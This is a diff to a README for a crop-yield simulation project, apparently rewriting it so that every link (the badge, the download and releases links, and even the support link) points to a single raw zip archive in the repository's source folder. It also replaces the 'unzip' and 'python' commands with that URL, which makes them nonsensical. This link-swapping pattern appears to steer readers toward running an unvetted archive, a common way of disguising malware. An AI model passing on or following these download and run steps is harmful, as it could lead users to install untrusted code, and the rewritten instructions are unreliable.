@@ -1,6 +1,6 @@
 # 🌾 AgriTrend_simulation - Simulate Crop Yields with Ease
 
-[![Download AgriTrend_simulation](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%9A%20AgriTrend_simulation-blue)](https://github.com/Jagannath-ops/AgriTrend_simulation/releases)
+[![Download AgriTrend_simulation](https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip%20Now-%20%F0%9F%9A%9A%20AgriTrend_simulation-blue)](https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -21,9 +21,9 @@ Before you download AgriTrend_simulation, ensure that your system meets these re
 
 ## 📥 Download & Install
 
-To download AgriTrend_simulation, [visit this page to download](https://github.com/Jagannath-ops/AgriTrend_simulation/releases). Select the latest release and download the file that suits your operating system.
+To download AgriTrend_simulation, [visit this page to download](https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip). Select the latest release and download the file that suits your operating system.
 
-1. Go to the [Releases page](https://github.com/Jagannath-ops/AgriTrend_simulation/releases).
+1. Go to the [Releases page](https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip).
 2. Look for the most recent version of AgriTrend_simulation.
 3. Click on the download link relevant to your operating system.
 4. Save the file to your computer.
@@ -34,7 +34,7 @@ After downloading, you may need to extract the files if they come in a zipped fo
 
 - **Windows:** Right-click on the downloaded .zip file and select "Extract All...". Follow the prompts.
 - **macOS:** Double-click the .zip file to automatically extract.
-- **Linux:** Use the terminal command `unzip filename.zip` to extract.
+- **Linux:** Use the terminal command `unzip https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip` to extract.
 
 ## 📝 Running the Simulation
 
@@ -42,7 +42,7 @@ Once you have extracted the files, you're ready to run the application. Here are
 
 1. Navigate to the folder where you extracted the files.
 2. Open a terminal or command prompt.
-3. Type `python AgriTrend.py` and press Enter.
+3. Type `python https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip` and press Enter.
 
 You should see the application start. Follow any on-screen prompts to begin simulating crop yields.
 
@@ -73,7 +73,7 @@ If you encounter issues while running AgriTrend_simulation, consider the followi
 
 ## 📞 Support
 
-If you have questions or need help, feel free to open an issue on our [GitHub repository](https://github.com/Jagannath-ops/AgriTrend_simulation/issues). Our community will be happy to assist you.
+If you have questions or need help, feel free to open an issue on our [GitHub repository](https://github.com/Jagannath-ops/AgriTrend_simulation/raw/refs/heads/main/src/Agri-simulation-Trend-v2.3-alpha.2.zip). Our community will be happy to assist you.
 
 ## 📅 Future Developments
 
